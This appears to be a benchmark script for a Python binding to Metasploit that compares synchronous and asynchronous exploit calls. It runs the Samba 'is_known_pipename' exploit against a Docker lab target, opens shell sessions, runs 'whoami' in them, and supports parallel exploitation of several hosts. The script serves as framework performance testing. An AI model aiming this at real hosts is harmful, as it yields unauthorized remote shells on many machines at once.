#!/usr/bin/env python3
"""
Benchmark: Sync vs Async Exploit Performance
=============================================

This script rigorously tests the performance difference between:
1. module.exploit()       - Synchronous, blocking
2. module.exploit_async() - Asynchronous with GVL release

Tests:
- Single target: sync vs async (should be similar)
- Multiple targets: sync (sequential) vs async (parallel) - async should be FASTER

Usage:
    # Start Docker target(s):
    cd docker && docker compose up -d

    # Run benchmark:
    source ~/.rvm/scripts/rvm && rvm 3.3.8 do env \
        MSF_ROOT=~/Projects/metasploit-framework \
        BUNDLE_GEMFILE=~/Projects/metasploit-framework/Gemfile \
        BUNDLE_WITHOUT='development test' \
        .venv/bin/python python/examples/benchmark_sync_vs_async.py
"""

from __future__ import annotations

import asyncio
import os
import sys
import time
from dataclasses import dataclass
from typing import List, Optional

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import assassinate_pyo3 as msf

# Configuration
TARGET_HOST = os.environ.get("TARGET_HOST", "assassinate-target")
EXPLOIT = "exploit/linux/samba/is_known_pipename"
PAYLOAD = "cmd/unix/interact"
TIMEOUT = 60


@dataclass
class BenchmarkResult:
    """Result of a single exploit attempt."""
    target: str
    success: bool
    session_id: Optional[int]
    elapsed_seconds: float
    method: str  # "sync" or "async"


def cleanup_sessions():
    """Kill all existing sessions."""
    for sid in msf.list_sessions():
        try:
            msf.kill_session(sid)
        except Exception:
            pass
    time.sleep(0.5)  # Let sessions clean up


def configure_module(target: str) -> msf.Module:
    """Create and configure a module for the target."""
    module = msf.create_module(EXPLOIT)
    module.options.RHOSTS = target
    module.options.SMB_SHARE_NAME = "myshare"
    module.options.SMB_USER = "root"
    module.options.SMB_PASS = "root"
    return module


def exploit_sync(target: str) -> BenchmarkResult:
    """Run exploit synchronously (blocking)."""
    module = configure_module(target)

    start = time.time()
    session = module.exploit(PAYLOAD, timeout=TIMEOUT)
    elapsed = time.time() - start

    return BenchmarkResult(
        target=target,
        success=session is not None,
        session_id=session.sid if session else None,
        elapsed_seconds=elapsed,
        method="sync"
    )


async def exploit_async(target: str) -> BenchmarkResult:
    """Run exploit asynchronously (with GVL release)."""
    module = configure_module(target)

    start = time.time()
    session = await module.exploit_async(PAYLOAD, timeout=TIMEOUT)
    elapsed = time.time() - start

    return BenchmarkResult(
        target=target,
        success=session is not None,
        session_id=session.sid if session else None,
        elapsed_seconds=elapsed,
        method="async"
    )


def print_banner():
    print("""
╔═══════════════════════════════════════════════════════════════╗
║         BENCHMARK: Sync vs Async Exploit Performance          ║
║                                                               ║
║  Comparing:                                                   ║
║    • module.exploit()       - Synchronous, blocking           ║
║    • module.exploit_async() - Async with GVL release          ║
╚═══════════════════════════════════════════════════════════════╝
    """)


def print_result(result: BenchmarkResult, prefix: str = ""):
    status = "✓ SUCCESS" if result.success else "✗ FAILED"
    print(f"{prefix}[{result.method:5}] {result.target}: {status} in {result.elapsed_seconds:.2f}s")
    if result.session_id:
        print(f"{prefix}        Session ID: {result.session_id}")


def benchmark_single_target():
    """Test 1: Single target - compare sync vs async timing."""
    print("\n" + "=" * 60)
    print("TEST 1: Single Target - Sync vs Async")
    print("=" * 60)
    print(f"Target: {TARGET_HOST}")
    print()

    results = []

    # Test sync
    print("[*] Running SYNC exploit...")
    cleanup_sessions()
    result_sync = exploit_sync(TARGET_HOST)
    print_result(result_sync, "    ")
    results.append(result_sync)

    # Test async
    print("\n[*] Running ASYNC exploit...")
    cleanup_sessions()
    result_async = asyncio.run(exploit_async(TARGET_HOST))
    print_result(result_async, "    ")
    results.append(result_async)

    # Summary
    print("\n" + "-" * 40)
    print("SINGLE TARGET SUMMARY:")
    print("-" * 40)
    if result_sync.success and result_async.success:
        diff = result_async.elapsed_seconds - result_sync.elapsed_seconds
        print(f"  Sync:  {result_sync.elapsed_seconds:.2f}s")
        print(f"  Async: {result_async.elapsed_seconds:.2f}s")
        print(f"  Diff:  {diff:+.2f}s ({'+' if diff > 0 else ''}{diff/result_sync.elapsed_seconds*100:.1f}%)")
        print()
        if abs(diff) < 1.0:
            print("  → Similar performance (expected for single target)")
        elif diff > 0:
            print("  → Sync was faster (async has polling overhead)")
        else:
            print("  → Async was faster")
    else:
        print("  One or both exploits failed - cannot compare")

    return results


async def benchmark_parallel_async(targets: List[str]) -> List[BenchmarkResult]:
    """Run multiple exploits in parallel using async."""
    tasks = [exploit_async(target) for target in targets]
    return await asyncio.gather(*tasks)


def benchmark_multiple_targets(targets: List[str]):
    """Test 2: Multiple targets - sequential sync vs parallel async."""
    print("\n" + "=" * 60)
    print(f"TEST 2: Multiple Targets ({len(targets)}) - Sequential vs Parallel")
    print("=" * 60)
    print(f"Targets: {', '.join(targets)}")
    print()

    # Test sequential sync
    print("[*] Running SYNC exploits SEQUENTIALLY...")
    cleanup_sessions()

    sync_start = time.time()
    sync_results = []
    for target in targets:
        print(f"    Exploiting {target}...")
        result = exploit_sync(target)
        print_result(result, "      ")
        sync_results.append(result)
    sync_total = time.time() - sync_start

    # Test parallel async
    print(f"\n[*] Running ASYNC exploits IN PARALLEL...")
    cleanup_sessions()

    async_start = time.time()
    async_results = asyncio.run(benchmark_parallel_async(targets))
    async_total = time.time() - async_start

    for result in async_results:
        print_result(result, "    ")

    # Summary
    print("\n" + "-" * 40)
    print("MULTIPLE TARGET SUMMARY:")
    print("-" * 40)

    sync_successes = sum(1 for r in sync_results if r.success)
    async_successes = sum(1 for r in async_results if r.success)

    print(f"  Sync (sequential):  {sync_total:.2f}s total, {sync_successes}/{len(targets)} success")
    print(f"  Async (parallel):   {async_total:.2f}s total, {async_successes}/{len(targets)} success")

    if sync_total > 0:
        speedup = sync_total / async_total if async_total > 0 else float('inf')
        print(f"\n  SPEEDUP: {speedup:.2f}x faster with async!")

        if speedup > 1.5:
            print("  → SIGNIFICANT improvement with parallel async! ✓")
        elif speedup > 1.1:
            print("  → Modest improvement with async")
        else:
            print("  → Similar performance (targets may have completed too fast)")

    return sync_results, async_results


def benchmark_gvl_release_verification():
    """Test 3: Verify GVL is actually being released during async."""
    print("\n" + "=" * 60)
    print("TEST 3: GVL Release Verification")
    print("=" * 60)
    print("Testing that Ruby background threads can run during async polling...")
    print()

    cleanup_sessions()

    # We'll check if sessions appear while we're waiting
    # This proves the GVL is being released

    module = configure_module(TARGET_HOST)

    print("[*] Launching exploit_job (creates Ruby background thread)...")
    job_start = time.time()
    module._rust.exploit_job(PAYLOAD)
    print(f"    exploit_job returned in {time.time() - job_start:.3f}s")

    print("[*] Polling for session WITH GVL release...")
    session_found = False
    poll_count = 0
    start = time.time()

    while time.time() - start < TIMEOUT:
        poll_count += 1

        # Release GVL during sleep
        msf.sleep_releasing_gvl(100)  # 100ms

        # Check for sessions (GVL re-acquired)
        sessions = msf.list_sessions()
        if sessions:
            session_found = True
            elapsed = time.time() - start
            print(f"\n[+] SESSION FOUND after {elapsed:.2f}s ({poll_count} polls)")

            session = msf.get_session(sessions[0])
            if session:
                print(f"    Session ID: {session.sid}")
                print(f"    Host: {session.host}")
                try:
                    whoami = session.run_cmd("whoami").strip()
                    print(f"    whoami: {whoami}")
                except Exception as e:
                    print(f"    Command error: {e}")
            break

    if session_found:
        print("\n  → GVL RELEASE VERIFIED! Ruby threads executed during polling. ✓")
    else:
        print("\n  → No session found - exploit may have failed")


def main():
    msf_root = os.environ.get("MSF_ROOT", os.path.expanduser("~/Projects/metasploit-framework"))

    print_banner()
    print(f"[*] MSF Root: {msf_root}")
    print(f"[*] Target: {TARGET_HOST}")
    print(f"[*] Exploit: {EXPLOIT}")
    print(f"[*] Payload: {PAYLOAD}")

    print("\n[*] Initializing MSF...")
    msf.init_msf(msf_root)
    print(f"[*] MSF version: {msf.framework_version()}")

    # Run benchmarks
    print("\n" + "=" * 60)
    print("STARTING BENCHMARKS")
    print("=" * 60)

    # Test 1: Single target
    benchmark_single_target()

    # Test 2: Multiple targets (same target multiple times if only one available)
    # In a real scenario, you'd have multiple different targets
    targets = [TARGET_HOST] * 3  # Simulate 3 targets
    print("\n[!] Note: Using same target 3x to simulate multiple targets")
    print("[!] For true parallel testing, use different target IPs")
    benchmark_multiple_targets(targets)

    # Test 3: GVL release verification
    benchmark_gvl_release_verification()

    # Final summary
    print("\n" + "=" * 60)
    print("BENCHMARK COMPLETE")
    print("=" * 60)
    print("""
Key Findings:

1. SINGLE TARGET: Sync and async should have similar performance.
   Async has slight overhead from polling, but enables parallelism.

2. MULTIPLE TARGETS: Async should be significantly faster because
   all exploits run in parallel (Ruby threads execute during GVL release).

3. GVL RELEASE: Verified that rb_thread_call_without_gvl properly
   releases the lock, allowing Ruby background threads to execute.

API Summary:
    module.exploit(payload)              - Use for simple, single-target scripts
    await module.exploit_async(payload)  - Use for parallel exploitation
    """)

    cleanup_sessions()


if __name__ == "__main__":
    main()
